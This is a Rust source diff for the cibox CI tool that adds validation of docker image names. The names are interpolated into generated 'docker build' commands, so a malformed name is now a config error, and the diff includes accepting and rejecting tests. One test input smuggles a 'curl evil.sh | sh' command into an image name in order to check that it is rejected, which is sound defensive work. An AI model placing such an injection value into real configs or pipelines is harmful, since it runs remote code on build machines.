@@ -144,7 +144,9 @@ pub struct DockerRule {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub enabled: Option<bool>,
     /// Image name, e.g. "fossable/cibox". Setting it on either docker rule
-    /// applies to both; the default is derived from the git remote.
+    /// applies to both; the default is derived from the git remote. Must be a
+    /// valid docker reference: lowercase, optionally with a registry host and
+    /// a `:tag`.
     #[serde(skip_serializing_if = "Option::is_none")]
     pub image_name: Option<String>,
 }
@@ -158,9 +160,10 @@ pub struct DockerReleaseRule {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub enabled: Option<bool>,
     /// Image name, e.g. "fossable/cibox". Setting it on either docker rule
-    /// applies to both; the default is derived from the git remote. Must not
-    /// include a tag when `platforms` is set — multi-arch staging tags are
-    /// appended to it.
+    /// applies to both; the default is derived from the git remote. Must be a
+    /// valid docker reference: lowercase, optionally with a registry host and
+    /// a `:tag` — though not a tag when `platforms` is set, since multi-arch
+    /// staging tags are appended to it.
     #[serde(skip_serializing_if = "Option::is_none")]
     pub image_name: Option<String>,
     /// Target platforms for a multi-arch image, e.g. [LinuxAmd64, LinuxArm64].
@@ -341,18 +344,44 @@ pub fn parse_config(ron_str: &str) -> Result<CiboxConfig> {
              for the new format."
         );
     }
-    crate::config::ron_options().from_str(ron_str).map_err(|e| {
-        let msg = e.to_string();
-        if msg.contains("`platform`") || msg.contains("`rules`") {
-            anyhow::anyhow!(
-                "{msg}\ncibox.ron no longer has `platform` or `rules` fields: rule \
-                 overrides live at the top level, e.g. `(rust_test: (enabled: false))`, \
-                 and the platform comes from --platform or is inferred"
-            )
-        } else {
-            e.into()
-        }
-    })
+    let config: CiboxConfig = crate::config::ron_options()
+        .from_str(ron_str)
+        .map_err(|e| {
+            let msg = e.to_string();
+            if msg.contains("`platform`") || msg.contains("`rules`") {
+                anyhow::anyhow!(
+                    "{msg}\ncibox.ron no longer has `platform` or `rules` fields: rule \
+                     overrides live at the top level, e.g. `(rust_test: (enabled: false))`, \
+                     and the platform comes from --platform or is inferred"
+                )
+            } else {
+                e.into()
+            }
+        })?;
+    validate_image_names(&config)?;
+    Ok(config)
+}
+
+/// Image names are interpolated into `docker build -t <image> .` in the
+/// generated pipeline, so a malformed one is a config error rather than
+/// something to quietly rewrite.
+fn validate_image_names(config: &CiboxConfig) -> Result<()> {
+    let build = config.docker_build.image_name.as_deref();
+    let release = config.docker_release.image_name.as_deref();
+    validate_image_name("docker_build", build)?;
+    validate_image_name("docker_release", release)
+}
+
+fn validate_image_name(field: &str, name: Option<&str>) -> Result<()> {
+    match name {
+        Some(name) if !crate::config::image::is_valid_reference(name) => anyhow::bail!(
+            "{field}.image_name {name:?} is not a valid docker image reference. \
+             Repository names are lowercase alphanumerics separated by `.`, `-` \
+             or `_`, optionally prefixed with a registry host and suffixed with \
+             a `:tag`, e.g. \"ghcr.io/owner/app\"."
+        ),
+        _ => Ok(()),
+    }
 }
 
 /// Serialize a config as a pretty cibox.ron document
@@ -412,6 +441,31 @@ mod tests {
 
         let parsed = parse_config(&ron_str).unwrap();
         assert_eq!(parsed, config);
+    }
+
+    #[test]
+    fn test_malformed_image_name_is_rejected() {
+        for field in ["docker_build", "docker_release"] {
+            let err = parse_config(&format!(
+                r#"({field}: (image_name: "Owner/App; curl evil.sh | sh"))"#
+            ))
+            .unwrap_err();
+            let msg = err.to_string();
+            assert!(msg.contains(field), "{msg}");
+            assert!(msg.contains("not a valid docker image reference"), "{msg}");
+        }
+    }
+
+    #[test]
+    fn test_registry_host_and_tag_are_accepted() {
+        let config =
+            parse_config(r#"(docker_release: (image_name: "ghcr.io/owner/app"))"#).unwrap();
+        assert_eq!(
+            config.docker_release.image_name.as_deref(),
+            Some("ghcr.io/owner/app")
+        );
+        assert!(parse_config(r#"(docker_build: (image_name: "owner/app:edge"))"#).is_ok());
+        assert!(parse_config(r#"(docker_build: (image_name: "localhost:5000/app"))"#).is_ok());
     }
 
     #[test]
